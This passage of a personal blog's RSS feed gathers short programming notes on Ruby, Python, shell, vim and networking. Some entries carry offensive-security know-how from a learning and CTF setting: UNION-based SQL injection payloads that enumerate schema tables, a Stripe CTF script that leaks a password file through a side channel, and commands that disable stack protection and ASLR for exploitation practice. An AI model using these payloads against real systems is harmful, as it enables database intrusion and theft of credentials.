+      <link>//warrick.io/posts/how-long-is-the-linux-kernel-in-miles/</link>
+      <pubDate>Wed, 24 Apr 2013 23:07:53 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/how-long-is-the-linux-kernel-in-miles/</guid>
+      <description>So, if we count the bytes in each .h, .s, and .c file what do we get?
+find . -iname &amp;#39;*.c&amp;#39; -o -iname &amp;#39;*.h&amp;#39; -o -iname &amp;#39;*.s&amp;#39; -exec wc -c {} \; \  | ruby -n -e \  &amp;#34;puts ARGF.reduce(0) { |acc,val| acc + val.split.first.chomp.to_i }&amp;#34; # 9190080(12 + 2) / 300.0 * 9190080 / 12.0 / 5280.0 px font + px kerning / dpi * characters / foot / mile Approximately 6.</description>
+    </item>
+    
+    <item>
+      <title>save breakpoints to file in gdb</title>
+      <link>//warrick.io/posts/save-breakpoints-to-file-in-gdb/</link>
+      <pubDate>Sun, 21 Apr 2013 07:38:06 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/save-breakpoints-to-file-in-gdb/</guid>
+      <description>It took me entirely too long to look this up, but you can store your breakpoints to a file and restore them with the following commands:
+save breakpoints [filename] source [filename]</description>
+    </item>
+    
+    <item>
+      <title>working with large web resources in python</title>
+      <link>//warrick.io/posts/working-with-large-web-resources-in-python/</link>
+      <pubDate>Mon, 15 Apr 2013 18:52:46 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/working-with-large-web-resources-in-python/</guid>
+      <description>Saving the file to disk.1
+import urllib2 import shutil req = urllib2.urlopen(url) with open(filename, &amp;#39;wb&amp;#39;) as f: shutil.copyfileobj(req, f) Reading GZIP compressed CSV files:2
+import csv import gzip with gzip.open(filename) as f: reader = csv.reader(f, quoting=csv.QUOTE_NONE) header = csv.next() for row in reader: entry = dict(zip(header, row)) # ... http://stackoverflow.com/questions/9252812/using-csvreader-against-a-gzipped-file-in-python [return] http://stackoverflow.com/questions/1517616/stream-large-binary-files-with-urllib2-to-file [return]   </description>
+    </item>
+    
+    <item>
+      <title>metaclass / eigenclass / virtual class</title>
+      <link>//warrick.io/posts/metaclass-eigenclass-virtual-class/</link>
+      <pubDate>Wed, 10 Apr 2013 17:37:59 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/metaclass-eigenclass-virtual-class/</guid>
+      <description>class Object def metaclass class &amp;lt;&amp;lt; self self end end end A few must read posts about metaprogramming in Ruby:
+ http://dannytatom.me/metaid/ http://rubylearning.com/blog/2010/11/30/how-do-i-build-dsls-with-yield-and-instance_eval/ http://yehudakatz.com/2009/11/15/metaprogramming-in-ruby-its-all-about-the-self/ http://madebydna.com/all/code/2011/06/24/eigenclasses-demystified.html  </description>
+    </item>
+    
+    <item>
+      <title>markers in vim</title>
+      <link>//warrick.io/posts/markers-in-vim/</link>
+      <pubDate>Thu, 28 Mar 2013 15:57:18 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/markers-in-vim/</guid>
+      <description>Just started using markers in VIM to quickly navigate to places in my code.
+mr - set marker r, where r can be a-z &amp;#39;r - jump to mark stored in register r, beginning of line `r - jump to position stored in register r, exact position New or aspiring VIM users like myself should read these:
+ http://yanpritzker.com/2011/12/16/learn-to-speak-vim-verbs-nouns-and-modifiers/ http://stackoverflow.com/questions/1218390/what-is-your-most-productive-shortcut-with-vim/1220118#1220118  </description>
+    </item>
+    
+    <item>
+      <title>zsh automatically report time stats for long processes</title>
+      <link>//warrick.io/posts/zsh-automatically-report-time-stats-for-long-processes/</link>
+      <pubDate>Sun, 24 Mar 2013 05:16:28 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/zsh-automatically-report-time-stats-for-long-processes/</guid>
+      <description>export REPORTTIME=60 Setting the variable REPORTTIME to a value greater than zero will make ZSH automatically print execution times after the command finishes.
+ If nonzero, commands whose combined user and system execution times (measured in seconds) are greater than this value have timing statistics printed for them.
+ http://zsh.sourceforge.net/Doc/Release/Parameters.html#index-REPORTTIME</description>
+    </item>
+    
+    <item>
+      <title>reduce jpg size</title>
+      <link>//warrick.io/posts/reduce-jpg-size/</link>
+      <pubDate>Tue, 19 Feb 2013 22:34:56 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/reduce-jpg-size/</guid>
+      <description>convert original.jpeg -define jpeg:extent=2048kb output.jpg http://stackoverflow.com/questions/6917219/imagemagick-scale-jpeg-image-with-a-maximum-file-size</description>
+    </item>
+    
+    <item>
+      <title>unpacking a list of items from an array in ruby</title>
+      <link>//warrick.io/posts/unpacking-a-list-of-items-from-an-array-in-ruby/</link>
+      <pubDate>Mon, 11 Feb 2013 00:28:13 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/unpacking-a-list-of-items-from-an-array-in-ruby/</guid>
+      <description>I often find myself wanting a subset of a dictionary and find it unsightly syntactically to do a series of element references as it is repetitive and can make lines very long. Here is the example from the docs, augmented to demonstrate my meaning:
+h = { &amp;#34;cat&amp;#34; =&amp;gt; &amp;#34;feline&amp;#34;, &amp;#34;dog&amp;#34; =&amp;gt; &amp;#34;canine&amp;#34;, &amp;#34;cow&amp;#34; =&amp;gt; &amp;#34;bovine&amp;#34;, ... } cat, dog, cow = h[&amp;#34;cat&amp;#34;], h[&amp;#34;dog&amp;#34;], h[&amp;#34;cow&amp;#34;] Hashes of course have the select method allowing you to do something a little less repetitive, but certainly not any less concise in this case, and it still doesn&amp;rsquo;t help us unpack the values.</description>
+    </item>
+    
+    <item>
+      <title>bit hacks</title>
+      <link>//warrick.io/posts/bit-hacks/</link>
+      <pubDate>Sat, 09 Feb 2013 02:10:55 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/bit-hacks/</guid>
+      <description>Test if the nth bit is set.
+(x &amp;amp; (1 &amp;lt;&amp;lt; n))  Set the nth bit.
+x = x | (1 &amp;lt;&amp;lt; n)  Unset the nth bit.
+x = x &amp;amp; ~(1 &amp;lt;&amp;lt; n)  Toggle the nth bit.
+x = x ^ (1 &amp;lt;&amp;lt; n)  http://www.catonmat.net/blog/low-level-bit-hacks-you-absolutely-must-know/</description>
+    </item>
+    
+    <item>
+      <title>comments in zsh</title>
+      <link>//warrick.io/posts/comments-in-zsh/</link>
+      <pubDate>Thu, 07 Feb 2013 17:39:12 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/comments-in-zsh/</guid>
+      <description>By default, comments are disabled in zsh&amp;rsquo;s interactive interpreter:
+[warrick@maca ~] % # comment zsh: bad pattern: # I find this to be an incredibly annoying default, but here is how you enable such comments:
+[warrick@maca ~] % setopt interactivecomments</description>
+    </item>
+    
+    <item>
+      <title>python equivalent to argf or diamond operator</title>
+      <link>//warrick.io/posts/python-equivalent-to-argf-or-diamond-operator/</link>
+      <pubDate>Sun, 03 Feb 2013 23:21:32 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/python-equivalent-to-argf-or-diamond-operator/</guid>
+      <description>Ruby has ARGF and Perl has the diamond operator, but what convenience object or operator does Python provide for reading from files provided on the command line or stdin?
+import fileinput for line in fileinput.input(): process(line) http://docs.python.org/2/library/fileinput.html</description>
+    </item>
+    
+    <item>
+      <title>coalesce</title>
+      <link>//warrick.io/posts/coalesce/</link>
+      <pubDate>Tue, 29 Jan 2013 18:43:36 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/coalesce/</guid>
+      <description>I have never encountered the COALESCE function in SQL, so I feel the need to take note of it, COALESCE(value, ...) returns the first non-NULL value in the argument list.
+http://www.postgresql.org/docs/9.1/static/functions-conditional.html
+http://dev.mysql.com/doc/refman/5.0/en/comparison-operators.html#function_coalesce</description>
+    </item>
+    
+    <item>
+      <title>reverse ssh tunnel</title>
+      <link>//warrick.io/posts/reverse-ssh-tunnel/</link>
+      <pubDate>Fri, 18 Jan 2013 16:22:59 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/reverse-ssh-tunnel/</guid>
+      <description>When I have a machine behind a NAT that I know I&amp;rsquo;ll need remote access to over the weekend, I add this rudimentary little script:
+#!/bin/bash RUSER=warrick LPORT=5555 RHOST=&amp;#34;74.207.228.87&amp;#34; COMMAND=&amp;#34;ssh -N -f -R ${LPORT}:localhost:22 ${RUSER}@${RHOST}&amp;#34; pgrep -f -x &amp;#34;$COMMAND&amp;#34; &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 || $COMMAND I then add this to the crontab, which runs the script every 5 minutes:
+# KEY # +---------------- minute (0 - 59) # | +------------- hour (0 - 23) # | | +---------- day of month (1 - 31) # | | | +------- month (1 - 12) # | | | | +---- day of week (0 - 7 with Sunday=0 &amp;amp; 7) # | | | | | # * * * * * command to be executed */5 * * * * bash /home/user/rsshchk.</description>
+    </item>
+    
+    <item>
+      <title>redis lru cache decorator in python</title>
+      <link>//warrick.io/posts/redis-lru-cache-decorator-in-python/</link>
+      <pubDate>Sun, 09 Dec 2012 22:54:30 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/redis-lru-cache-decorator-in-python/</guid>
+      <description>Python 3 offers a brilliant decorator that adds a Least Recently Used (LRU) cache to any function:
+@lru_cache(maxsize=20) def get_pep(num): &amp;#39;Retrieve text of a Python Enhancement Proposal&amp;#39; resource = &amp;#39;http://www.python.org/dev/peps/pep-%04d/&amp;#39; % num try: with urllib.request.urlopen(resource) as s: return s.read() except urllib.error.HTTPError: return &amp;#39;Not Found&amp;#39; &amp;gt;&amp;gt;&amp;gt; for n in 8, 290, 308, 320, 8, 218, 320, 279, 289, 320, 9991: ... pep = get_pep(n) ... print(n, len(pep)) &amp;gt;&amp;gt;&amp;gt; print(get_pep.cache_info()) CacheInfo(hits=3, misses=8, maxsize=20, currsize=8) Functools has been back-ported to Python 2.</description>
+    </item>
+    
+    <item>
+      <title>week of year in python and in postgres</title>
+      <link>//warrick.io/posts/week-of-year-in-python-and-in-postgres/</link>
+      <pubDate>Tue, 04 Dec 2012 22:13:27 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/week-of-year-in-python-and-in-postgres/</guid>
+      <description>import datetime today = datetime.date.today() today.isocalendar()[1]SELECT EXTRACT(WEEK FROM TIMESTAMP &amp;#39;2012-12-04 20:38:40&amp;#39;);</description>
+    </item>
+    
+    <item>
+      <title>mdfind</title>
+      <link>//warrick.io/posts/mdfind/</link>
+      <pubDate>Wed, 31 Oct 2012 18:27:48 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/mdfind/</guid>
+      <description>I frequently use Spotlight, and I was pleasantly surprised to discover it has a command-line complement, mdfind.
+% mdfind sniffer.pdf /Users/warrick/Desktop/sniffers/sniffer.pdf /Users/warrick/CSCI/CSCI 6760 S12/presentations/sniffers/sniffer.</description>
+    </item>
+    
+    <item>
+      <title>multiple interfaces, multiple gateways</title>
+      <link>//warrick.io/posts/multiple-interfaces-multiple-gateways/</link>
+      <pubDate>Sun, 28 Oct 2012 03:17:55 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/multiple-interfaces-multiple-gateways/</guid>
+      <description>When configuring two interfaces, each on a different subnet, you must add an additional routing table to isolate interface traffic (e.g. eth0 in, eth0 out).
+1. Create a routing table. In our example we create a table named &amp;lsquo;secondary&amp;rsquo; with identifier 252:
+$ echo &amp;#39;252 secondary&amp;#39; &amp;gt;&amp;gt; /etc/iproute2/rt_tables If you check out /etc/iproute2/rt_tables you&amp;rsquo;ll see there are a few reserved identifiers one of which is for the primary routing table, main:</description>
+    </item>
+    
+    <item>
+      <title>x days ago in python</title>
+      <link>//warrick.io/posts/x-days-ago-in-python/</link>
+      <pubDate>Tue, 23 Oct 2012 23:36:44 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/x-days-ago-in-python/</guid>
+      <description>import datetime today = datetime.date.today() yesterday = today - datetime.timedelta(1) x = 5 x_days_ago = today - datetime.</description>
+    </item>
+    
+    <item>
+      <title>duck punching, in action</title>
+      <link>//warrick.io/posts/duck-punching-in-action/</link>
+      <pubDate>Mon, 22 Oct 2012 07:49:20 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/duck-punching-in-action/</guid>
+      <description>Following up on last post, this post is about a monkey patch I wrote to get a little more functionality out of one of Ruby&amp;rsquo;s standard libraries, Resolv.
+Resolv is a DNS stub resolver library written in Ruby that provides the ability to perform non-blocking DNS requests, but it doesn&amp;rsquo;t expose any sort of access to the raw DNS records returned, at least that I could tell.
+So, after tracing the code, I found that copying an existing function, modifying it very slightly, and patching it in was the easiest way to get in:</description>
+    </item>
+    
+    <item>
+      <title>duck punching</title>
+      <link>//warrick.io/posts/duck-punching/</link>
+      <pubDate>Mon, 15 Oct 2012 21:06:51 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/duck-punching/</guid>
+      <description>Heh, monkey patching is also called &amp;ldquo;duck punching&amp;rdquo;.
+Well, I was just totally sold by Adam, the idea being that if it walks like a duck and talks like a duck, it&#39;s a duck, right? So if this duck is not giving you the noise that you want, you&#39;ve got to just punch that duck until it returns what you expect.  http://en.wikipedia.org/wiki/Monkey_patch</description>
+    </item>
+    
+    <item>
+      <title>chattr</title>
+      <link>//warrick.io/posts/chattr/</link>
+      <pubDate>Mon, 15 Oct 2012 19:34:36 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/chattr/</guid>
+      <description>A friend reminded me about chattr. Linux ext{2,3,4} filesystems have supplementary file attributes which can be modified with the &amp;ldquo;change attributes&amp;rdquo; utility found in the e2fsprogs package.
+The two most interesting in my opinion are +/- i for immutable and +/- j for secure deletion:
+$ sudo chattr +i /bin/ps $ sudo chattr +j secret.txt $ lsattr bar ----i----j---e- bar</description>
+    </item>
+    
+    <item>
+      <title>ruby tricks</title>
+      <link>//warrick.io/posts/ruby-tricks/</link>
+      <pubDate>Thu, 11 Oct 2012 18:29:44 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/ruby-tricks/</guid>
+      <description>James Edward Gray II, a Ruby Rogue, just gave a talk at the Aloha Ruby Conference about a bunch of Ruby tricks. Here are a few I&amp;rsquo;m cataloging, but they are all worth a looksy.
+Trap (with a twist):
+require &amp;#39;pry&amp;#39; trap(:INT) do binding.pry trap(:INT, &amp;#34;EXIT&amp;#34;) end loop do sleep end Daemonize:
+Process.daemon loop do sleep end Subprocess:
+# spawn([env,] command... [,options]) =&amp;gt; pid pid = spawn({&amp;#34;VAR&amp;#34; =&amp;gt; 7564}, &amp;#34;/usr/local/bin/program&amp;#34;, in: open(&amp;#34;input-file&amp;#34;)) Process.</description>
+    </item>
+    
+    <item>
+      <title>basic sql injection</title>
+      <link>//warrick.io/posts/basic-sql-injection/</link>
+      <pubDate>Thu, 04 Oct 2012 17:18:44 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/basic-sql-injection/</guid>
+      <description>SELECT user FROM users WHERE user.name = &amp;#39;jeffrey&amp;#39;;  FIND NUMBER OF COLUMNS
+&amp;ldquo;order by&amp;rdquo; trick - test if you can order by a column number
+ NOW WE CAN DO A UNION (# OF COLUMNS MUST MATCH)
+&amp;rsquo; union select 1,2,3,version() &amp;ndash; -
+ NOW WE CAN GET TABLE, COLUMN, AND DATABASE INFO
+&amp;rsquo; union select 1,2,3,table_name from information_schema.tables where table_schema=&amp;ldquo;x8250&amp;rdquo; &amp;ndash; -
+&amp;rsquo; union select 1,2,3,column_name from information_schema.columns where table&amp;hellip;</description>
+    </item>
+    
+    <item>
+      <title>disable aslr</title>
+      <link>//warrick.io/posts/disable-aslr/</link>
+      <pubDate>Sat, 29 Sep 2012 17:05:49 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/disable-aslr/</guid>
+      <description>sudo sysctl -w kernel.</description>
+    </item>
+    
+    <item>
+      <title>zsh globbing qualifiers</title>
+      <link>//warrick.io/posts/zsh-globbing-qualifiers/</link>
+      <pubDate>Thu, 27 Sep 2012 16:02:29 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/zsh-globbing-qualifiers/</guid>
+      <description>Globbing is the term for pattern matching that shells use to expand wildcards like * or ?. In zsh, globbing patterns can be followed by a list of qualifiers inside of parenthesis, which restrict the filenames that match the glob.
+For example, here are a few globs with simple modifiers:
+# . modifier means all &amp;#34;plain files&amp;#34; % ls *(.) foo.txt bar.jpg # * modifier means all &amp;#34;executable plain files&amp;#34; % ls *(*) a.</description>
+    </item>
+    
+    <item>
+      <title>compile binary without protection</title>
+      <link>//warrick.io/posts/compile-binary-without-protection/</link>
+      <pubDate>Tue, 25 Sep 2012 14:19:28 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/compile-binary-without-protection/</guid>
+      <description>Compile a 32bit binary with an executable stack and no canary values:
+gcc -m32 -fno-stack-protector -zexecstack -mpreferred-stack-boundary=2 -o foo foo.</description>
+    </item>
+    
+    <item>
+      <title>one-line tree in python</title>
+      <link>//warrick.io/posts/one-line-tree-in-python/</link>
+      <pubDate>Thu, 30 Aug 2012 03:05:30 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/one-line-tree-in-python/</guid>
+      <description>Brilliant:
+from collections import defaultdict def tree(): return defaultdict(tree) https://gist.github.com/2012250</description>
+    </item>
+    
+    <item>
+      <title>restrict routes to an ip in rails</title>
+      <link>//warrick.io/posts/restrict-routes-to-an-ip-in-rails/</link>
+      <pubDate>Sun, 19 Aug 2012 05:58:19 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/restrict-routes-to-an-ip-in-rails/</guid>
+      <description>constraints :remote_ip =&amp;gt; &amp;#34;127.0.0.1&amp;#34; do get &amp;#39;/restricted&amp;#39; =&amp;gt; &amp;#34;root#restricted&amp;#34; end  &amp;ldquo;You can also constrain a route based on any method on the Request object that returns a String.&amp;rdquo;
+ http://guides.rubyonrails.org/routing.html#request-based-constraints</description>
+    </item>
+    
+    <item>
+      <title>linux syscalls</title>
+      <link>//warrick.io/posts/linux-syscalls/</link>
+      <pubDate>Fri, 15 Jun 2012 21:36:09 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/linux-syscalls/</guid>
+      <description>Where are linux system calls defined?
+If you are crafting your own shellcode, you often need to find the syscall numbers. Syscalls are usually defined in:  /usr/include/asm/unistd_32.h /usr/include/asm/unistd_64.h</description>
+    </item>
+    
+    <item>
+      <title>python one-line ftp</title>
+      <link>//warrick.io/posts/python-one-line-ftp/</link>
+      <pubDate>Sun, 03 Jun 2012 04:50:06 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/python-one-line-ftp/</guid>
+      <description>So, while looking for a quick and easy FTP server analog to this popular Python trick:
+$ python -m SimpleHTTPServer Serving HTTP on 0.0.0.0 port 8000 ... I found a Stackoverflow post that shows Twisted has a one line FTP and more:
+$ twistd -n ftp The -n option is for &amp;ldquo;nodaemon&amp;rdquo;; don&amp;rsquo;t daemonize and run in the foreground.
+Just looking at the options for twistd, it looks like you can also do port-forwarding, SOCKS tunneling, a HTTP server, a DNS server, and more.</description>
+    </item>
+    
+    <item>
+      <title>iproute2</title>
+      <link>//warrick.io/posts/iproute2/</link>
+      <pubDate>Sat, 21 Apr 2012 23:06:37 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/iproute2/</guid>
+      <description>I was surprised to find out that ifconfig and route are actually deprecated, despite their ubiquity.
+Even more unfortunate, their replacement, namely the ip command, doesn&amp;rsquo;t seem to have any concern for the readability of its output.
+Here is how you would statically assign an IP, Netmask, Gateway, and DNS servers with ifconfig and route and the equivalent commands in ip:
+$ ifconfig eth0 up $ ip link set eth0 up Configure your IP and Netmask:</description>
+    </item>
+    
+    <item>
+      <title>less print</title>
+      <link>//warrick.io/posts/less-print/</link>
+      <pubDate>Sun, 08 Apr 2012 06:04:29 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/less-print/</guid>
+      <description>Excellent point:
+http://inventwithpython.com/blog/2012/04/06/stop-using-print-for-debugging-a-5-minute-quickstart-guide-to-pythons-logging-module/
+import logging logging.basicConfig(level=logging.DEBUG, format=&amp;#39;%(asctime)s- %(levelname)s- %(message)s&amp;#39;) logging.debug(&amp;#39;message&amp;#39;) In Ruby:
+http://www.ruby-doc.org/stdlib-1.9.3/libdoc/logger/rdoc/Logger.html
+require &amp;#39;logger&amp;#39; log = Logger.new(STDOUT) log.level = Logger::WARN log.debug(&amp;#34;Created logger&amp;#34;) log.info(&amp;#34;Program started&amp;#34;) log.warn(&amp;#34;Nothing to do!</description>
+    </item>
+    
+    <item>
+      <title>fix slow ssh logins</title>
+      <link>//warrick.io/posts/fix-slow-ssh-logins/</link>
+      <pubDate>Sun, 08 Apr 2012 02:19:57 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/fix-slow-ssh-logins/</guid>
+      <description>http://unix.stackexchange.com/questions/5621/how-to-speed-my-too-slow-ssh-login</description>
+    </item>
+    
+    <item>
+      <title>comparison operator</title>
+      <link>//warrick.io/posts/comparison-operator/</link>
+      <pubDate>Tue, 13 Mar 2012 06:04:10 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/comparison-operator/</guid>
+      <description>Python doesn&amp;rsquo;t have the &amp;lt;=&amp;gt; comparison operator, but this is the equivalent:
+ (a  b) - (a http://docs.python.org/release/3.0.1/whatsnew/3.0.html</description>
+    </item>
+    
+    <item>
+      <title>streams with tshark</title>
+      <link>//warrick.io/posts/streams-with-tshark/</link>
+      <pubDate>Fri, 09 Mar 2012 06:22:05 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/streams-with-tshark/</guid>
+      <description>Wiresharks command-line complement, tshark, is pretty handy in a jam. You can even extract stream numbers:
+$ tshark -r dump.pcap -T fields -e tcp.stream Using the stream numbers, you can be much more precise in your filters:
+$ tshark -r dump.pcap -T fields -e text tcp.stream eq $stream </description>
+    </item>
+    
+    <item>
+      <title>gdb show asm on break</title>
+      <link>//warrick.io/posts/gdb-show-asm-on-break/</link>
+      <pubDate>Wed, 07 Mar 2012 20:14:08 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/gdb-show-asm-on-break/</guid>
+      <description>Display a number of lines:
+display /3i $pc or
+set disassemble-next-line on http://stackoverflow.com/questions/1902901/show-current-instruction-in-gdb</description>
+    </item>
+    
+    <item>
+      <title>encrypt small files with ssh keys</title>
+      <link>//warrick.io/posts/encrypt-small-files-with-ssh-keys/</link>
+      <pubDate>Fri, 02 Mar 2012 22:49:38 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/encrypt-small-files-with-ssh-keys/</guid>
+      <description>Convert RSA public key and private key to PEM format:
+$ openssl rsa -in ~/.ssh/id_rsa -outform pem &amp;gt; id_rsa.pem $ openssl rsa -in ~/.ssh/id_rsa -pubout -outform pem &amp;gt; id_rsa.pub.pem Encrypting a file with your public key:
+$ openssl rsautl -encrypt -pubin -inkey id_rsa.pub.pem \ -in file.txt -out file.enc Decrypting the file with your private key:
+$ openssl rsautl -decrypt -inkey id_rsa.pem \ -in file.enc -out file.txt Of course, this is asymmetric encryption and your file must be less than or equal in size to your key!</description>
+    </item>
+    
+    <item>
+      <title>bash regex matching</title>
+      <link>//warrick.io/posts/bash-regex-matching/</link>
+      <pubDate>Fri, 02 Mar 2012 02:18:15 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/bash-regex-matching/</guid>
+      <description>Incredibly, Bash allows you to do regular expression comparisons with the =~ operator that Ruby and Perl use:
+$ if [[ &amp;#34;foo&amp;#34; =~ f.* ]]; then echo match fi match http://tldp.org/LDP/abs/html/abs-guide.html#REGEXMATCHREF</description>
+    </item>
+    
+    <item>
+      <title>level06 stripe ctf</title>
+      <link>//warrick.io/posts/level06-stripe-ctf/</link>
+      <pubDate>Wed, 29 Feb 2012 10:05:46 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/level06-stripe-ctf/</guid>
+      <description>#!/usr/bin/env bash  ulimit -f 1 # set file size limit to 1024 bytes  s=&amp;#34;&amp;#34; while true; do for ((i=32; i &amp;lt; 127; i++)); do rm f o c=$(ruby -e &amp;#34;print ${i}.chr&amp;#34;) t=&amp;#34;${s}${c}...&amp;#34; echo &amp;#34;${t}&amp;#34; ruby -e &amp;#34;print &amp;#39;A&amp;#39; * (1024-33-${#t}+3)&amp;#34; &amp;gt; f; /levels/level06 /home/the-flag/.password &amp;#34;${t}&amp;#34; 2&amp;gt;&amp;gt;f 1&amp;gt;o; sleep 0.1 # INCREASE LIBERALLY IF FALSE POSITIVES  if [ ! -s o ]; then # if file o is empty  s=&amp;#34;${s}${c}&amp;#34; echo -n $c break fi done done</description>
+    </item>
+    
+    <item>
+      <title>bash c-style escapes </title>
+      <link>//warrick.io/posts/bash-c-style-escapes/</link>
+      <pubDate>Tue, 28 Feb 2012 18:59:33 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/bash-c-style-escapes/</guid>
+      <description>$ echo $&amp;#39;hello\nworld&amp;#39; hello world</description>
+    </item>
+    
+    <item>
+      <title>open</title>
+      <link>//warrick.io/posts/open/</link>
+      <pubDate>Sun, 26 Feb 2012 21:45:55 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/open/</guid>
+      <description>Mac OS X has an open command-line utility that I use extensively from the terminal. If ever I need to open a directory or any file with its default application, I just simply type open file and there is no need to open Finder and traverse to the directory.
+# open a finder window in current directory $ open . $ open http://google.com $ open image.jpg In Linux, you can get the same functionality with gnome-open:</description>
+    </item>
+    
+    <item>
+      <title>canonical</title>
+      <link>//warrick.io/posts/canonical/</link>
+      <pubDate>Mon, 20 Feb 2012 18:28:14 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/canonical/</guid>
+      <description> Reduced to the simplest and most significant form possible without loss of generality.
+ </description>
+    </item>
+    
+    <item>
+      <title>theory highlights</title>
+      <link>//warrick.io/posts/theory-highlights/</link>
+      <pubDate>Sun, 19 Feb 2012 03:13:01 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/theory-highlights/</guid>
+      <description>&amp;ldquo;This discussion highlights an important difference between complexity theory and computability theory. In computability theory, the Church-Turing thesis implies that all reasonable models of computation are equivalent - that is, they all decide the same class of languages. In complexity theory, the choice of model affects the time complexity of languages. Languages that are decidable in, say, linear time on one model aren&amp;rsquo;t necessarily decidable in linear time on another.</description>
+    </item>
+    
+    <item>
+      <title>coercing expressions to booleans</title>
+      <link>//warrick.io/posts/coercing-expressions-to-booleans/</link>
+      <pubDate>Tue, 14 Feb 2012 18:17:18 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/coercing-expressions-to-booleans/</guid>
+      <description>In Ruby, you may need to coerce an expression to an explicit boolean value.
+This:
+b = defined?(foo) ? true : false becomes:
+b = !!defined?(foo) That is a double not (!) operator.
+irb(main):001:0&amp;gt; !!false =&amp;gt; false irb():002:0&amp;gt; !!nil =&amp;gt; false irb(main):003:0&amp;gt; !!true =&amp;gt; true irb(main): http://rubyrogues.com/032-rr-ruby-antipatterns/</description>
+    </item>
+    
+    <item>
+      <title>ruby fiddle 1.9.3</title>
+      <link>//warrick.io/posts/ruby-fiddle-1-9-3/</link>
+      <pubDate>Tue, 14 Feb 2012 05:10:59 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/ruby-fiddle-1-9-3/</guid>
+      <description>After watching Peter Cooper&amp;rsquo;s Ruby Trick Shots I wanted to experiment with loading dynamic libraries in Ruby as he demoed.
+Maddeningly, when I tried to require fiddle, Ruby was throwing a LoadError:
+LoadError: cannot load such file -- fiddle Digging into the RVM logs in ~/.rvm/log/ruby-1.9.3-p0, I found that when RVM compiled Ruby it failed to find the ffi.h header and subsequently did not install fiddle.
+$ grep -A 2 fiddle ~/.</description>
+    </item>
+    
+    <item>
+      <title>tabindex</title>
+      <link>//warrick.io/posts/tabindex/</link>
+      <pubDate>Tue, 14 Feb 2012 01:01:26 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/tabindex/</guid>
+      <description>Hey Web Developers, how about when you add a login form to a page you ALWAYS add a tagindex attribute and make the username and password fields the first elements in the tabbing order.
+The internet thanks you, KTHXBYE.
+&amp;lt;p&amp;gt; &amp;lt;label for=&amp;#34;user&amp;#34;&amp;gt;Username&amp;lt;/label&amp;gt;&amp;lt;br /&amp;gt; &amp;lt;input name=&amp;#34;user&amp;#34; tabindex=&amp;#34;1&amp;#34; type=&amp;#34;text&amp;#34; value=&amp;#34;&amp;#34; /&amp;gt; &amp;lt;/p&amp;gt; &amp;lt;p&amp;gt; &amp;lt;label for=&amp;#34;pass&amp;#34;&amp;gt;Password&amp;lt;/label&amp;gt;&amp;lt;br /&amp;gt; &amp;lt;input name=&amp;#34;pass&amp;#34; tabindex=&amp;#34;2&amp;#34; type=&amp;#34;password&amp;#34; value=&amp;#34;&amp;#34; /&amp;gt; &amp;lt;/p&amp;gt; http://www.w3.org/TR/html4/interact/forms.html#adef-tabindex</description>
+    </item>
+    
+    <item>
+      <title>drop into an interactive interpreter from a script</title>
+      <link>//warrick.io/posts/drop-into-an-interactive-interpreter-from-a-script/</link>
+      <pubDate>Mon, 30 Jan 2012 22:33:40 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/drop-into-an-interactive-interpreter-from-a-script/</guid>
+      <description>Twice this weekend I&amp;rsquo;ve found that I would like to drop from a script into the interactive prompt and have the environment and context available to debug and test. Once in Ruby and once in Python.
+I do most active development with an interpreter open, but copying and pasting into the interpreter quickly becomes tedious.
+import pdb # ... pdb.set_trace()require &amp;#39;rubygems&amp;#39; require &amp;#39;ruby-debug&amp;#39; # ... debugger I will certainly be using these extensively at the very least to test my data-structures.</description>
+    </item>
+    
+    <item>
+      <title>Python unzip idiom</title>
+      <link>//warrick.io/posts/python-unzip-idiom/</link>
+      <pubDate>Mon, 30 Jan 2012 08:53:04 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/python-unzip-idiom/</guid>
+      <description>The *splat operator is commonly used to unzip arrays in Python:
